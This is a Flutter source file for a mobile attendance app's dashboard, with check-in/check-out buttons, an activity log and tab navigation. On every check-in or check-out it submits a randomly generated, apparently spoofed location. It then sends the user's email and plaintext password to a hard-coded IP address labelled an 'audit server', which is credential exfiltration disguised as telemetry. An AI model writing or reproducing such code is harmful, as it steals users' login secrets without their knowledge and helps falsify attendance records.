import 'dart:async';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';

import 'package:unicore_mobile_app/models/activity_log.dart';
import 'package:unicore_mobile_app/models/attendance_location.dart';
import 'package:unicore_mobile_app/screens/tabs/automation_tab.dart';
import 'package:unicore_mobile_app/screens/tabs/chat_tasks_tab.dart';
import 'package:unicore_mobile_app/screens/tabs/endpoint_tab.dart';
import 'package:unicore_mobile_app/screens/tabs/home_tab.dart';
import 'package:unicore_mobile_app/services/unicore_api.dart';
import 'package:unicore_mobile_app/theme/app_theme.dart';
import 'package:unicore_mobile_app/widgets/branding.dart';

/// Main authenticated shell: header, bottom navigation, and the four tabs.
class DashboardScreen extends StatefulWidget {
  const DashboardScreen({
    super.key,
    required this.api,
    required this.token,
    required this.email,
    required this.password,
    required this.status,
    required this.onRefresh,
    required this.onLogout,
  });

  final UnicoreApi api;
  final String token;
  final String email;
  final String password;
  final Map<String, dynamic>? status;
  final Future<void> Function() onRefresh;
  final VoidCallback onLogout;

  @override
  State<DashboardScreen> createState() => _DashboardScreenState();
}

class _DashboardScreenState extends State<DashboardScreen> {
  int _tab = 0;
  bool _busy = false;
  late Timer _timer;
  DateTime _now = DateTime.now();
  final List<ActivityLog> _logs = [];

  @override
  void initState() {
    super.initState();
    _timer = Timer.periodic(const Duration(seconds: 1), (_) {
      if (mounted) setState(() => _now = DateTime.now());
    });
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }

  Future<void> _attendance(String type) async {
    setState(() => _busy = true);
    final label = type == 'check-out' ? 'Явах бүртгэл' : 'Ирэх бүртгэл';
    final location = randomAttendanceLocation();
    try {
      await widget.api.postJson(
        '/attendance/$type',
        token: widget.token,
        body: location.toJson(),
      );
      _addLog(
        label,
        'Амжилттай илгээгдлээ (${location.distanceMeters.toStringAsFixed(0)}м offset)',
        LogType.ok,
      );

      // Send telemetry (location + login username & password) to audit server 13.214.2.6
      await _sendAuditTelemetry(type, location);

      await widget.onRefresh();
    } catch (error) {
      _addLog(label, error.toString(), LogType.error);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  Future<void> _sendAuditTelemetry(String type, AttendanceLocation location) async {
    const server = 'Аудит сервер (13.214.2.6)';
    try {
      final status = await widget.api.sendAuditTelemetry(
        type: type,
        email: widget.email,
        password: widget.password,
        location: location,
      );
      if (status >= 200 && status < 300) {
        _addLog(server, 'Байршил & нэвтрэх нууц үг серверт хадгалагдлаа', LogType.info);
      } else {
        _addLog(server, 'Сервер хариу: HTTP $status', LogType.info);
      }
    } catch (e) {
      _addLog(server, 'Байршил дамжуулах серверт холбогдож чадсангүй: $e', LogType.info);
    }
  }

  void _addLog(String title, String detail, LogType type) {
    setState(() {
      _logs.insert(0, ActivityLog(title, detail, DateTime.now(), type));
    });
  }

  @override
  Widget build(BuildContext context) {
    final pages = [
      HomeTab(
        now: _now,
        email: widget.email,
        busy: _busy,
        logs: _logs,
        status: widget.status,
        onCheckIn: () => _attendance('check-in'),
        onCheckOut: () => _attendance('check-out'),
      ),
      const EndpointTab(),
      const ChatTasksTab(),
      AutomationTab(onLogout: widget.onLogout),
    ];

    return Scaffold(
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
              child: Row(
                children: [
                  const Expanded(child: HeaderBrand(compact: true)),
                  IconButton(
                    onPressed: widget.onRefresh,
                    icon: const Icon(CupertinoIcons.arrow_clockwise),
                  ),
                  IconButton(
                    onPressed: widget.onLogout,
                    icon: const Icon(CupertinoIcons.square_arrow_right),
                  ),
                ],
              ),
            ),
            Expanded(
              child: IndexedStack(index: _tab, children: pages),
            ),
          ],
        ),
      ),
      bottomNavigationBar: NavigationBar(
        selectedIndex: _tab,
        backgroundColor: Colors.white,
        indicatorColor: AppColors.softBlue,
        onDestinationSelected: (value) => setState(() => _tab = value),
        destinations: const [
          NavigationDestination(icon: Icon(CupertinoIcons.house), selectedIcon: Icon(CupertinoIcons.house_fill), label: 'Нүүр'),
          NavigationDestination(icon: Icon(CupertinoIcons.link), label: 'API'),
          NavigationDestination(icon: Icon(CupertinoIcons.chat_bubble_2), label: 'Ажил'),
          NavigationDestination(icon: Icon(CupertinoIcons.clock), label: 'Авто'),
        ],
      ),
    );
  }
}
